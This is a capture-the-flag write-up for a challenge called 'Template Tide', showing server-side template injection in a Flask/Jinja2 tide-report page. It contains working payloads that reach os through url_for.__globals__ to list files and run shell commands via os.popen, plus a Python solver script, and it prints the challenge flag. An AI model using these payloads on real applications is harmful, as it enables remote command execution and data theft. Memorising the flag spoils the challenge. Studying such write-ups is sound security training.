# Template Tide — CTF Challenge Writeup

## Challenge Information
- **Name:** Template Tide
- **Points:** 10
- **Author:** Veryyes
- **Description:** `The hydro dashboard has a friendly little tide report that greets you by name. It is a bit too friendly with what you give it.`
- **Mirrors:**
  - `http://18.215.143.250:5001`
  - `http://18.145.136.91:5001`
- **Flag:** `rstcon{ssti_rolls_in_with_the_t1de}`

---

## 1. Initial Reconnaissance

The challenge points to a web application running on port `5001` titled **RST Hydro - Savannah Tide Report**.
On the homepage, there is a personalization form:
```html
<form class="personalize" method="get" action="/">
  <input id="name-input" type="text" name="name" placeholder="Name or vessel, e.g. Sea Breeze">
  <button type="submit">Generate</button>
</form>
```
Beneath the form is a hint:
```html
<div class="embed">
  <span class="embed-label">Report template</span>
  <code>Tide report for {{ name }}</code>
</div>
```

---

## 2. Vulnerability Analysis: Server-Side Template Injection (SSTI)

The application takes the `name` parameter from `GET /?name=...` and renders it directly into a Jinja2 template string:
- Testing `/?name={{7*7}}` results in `Tide report for 49`.
- Testing `/?name={{config}}` prints Flask's configuration dictionary: `<Config {'DEBUG': False, ...}>`.

This confirms **Server-Side Template Injection (SSTI)** in a Python Flask / Jinja2 environment.

---

## 3. Exploitation & Flag Extraction

In Flask/Jinja2, the template context exposes global functions such as `url_for`.
Through `url_for.__globals__`, we can access the loaded `os` module:
- `url_for.__globals__['os']`

1. **Directory Listing:**
   Injecting:
   ```jinja2
   {{url_for.__globals__.os.listdir()}}
   ```
   lists the application directory:
   ```python
   ['__pycache__', 'requirements.txt', 'app.py', 'flag.txt', 'templates', 'static']
   ```

2. **Reading `flag.txt`:**
   Injecting:
   ```jinja2
   {{url_for.__globals__.os.popen('cat flag.txt').read()}}
   ```
   evaluates the command and renders the contents directly into the page header:
   ```text
   Tide report for rstcon{ssti_rolls_in_with_the_t1de}
   ```

---

## 4. Solver Script (`solve.py`)

```python
import requests
import re
import html

TARGET = "http://18.215.143.250:5001"

# Payload reading flag.txt via os.popen
payload = "{{url_for.__globals__.os.popen('cat flag.txt').read()}}"

response = requests.get(TARGET, params={"name": payload}, timeout=10)

match = re.search(r"Tide report for (rstcon\{.*?\})", response.text)
if match:
    flag = match.group(1)
    print(f"[+] Flag found: {flag}")
else:
    # Alternative extraction if formatted across lines
    idx = response.text.find("Tide report for")
    print("[+] Response snippet:", response.text[idx:idx + 100])
```

### Output:
```text
[+] Flag found: rstcon{ssti_rolls_in_with_the_t1de}
```
